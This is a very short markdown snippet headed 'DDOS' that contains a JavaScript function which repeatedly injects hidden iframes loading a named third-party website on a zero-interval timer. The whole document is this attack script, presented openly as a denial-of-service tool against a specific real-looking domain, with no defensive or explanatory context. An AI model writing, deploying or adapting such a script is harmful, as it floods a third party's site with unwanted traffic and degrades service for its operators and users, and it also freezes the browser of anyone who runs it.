# DDOS
```js
function attack() {  
    document.body.innerHTML+='<iframe src="http://itplus-academy.edu.vn/" style="display:none;"></iframe>';
}
setInterval(attack, 0);
```
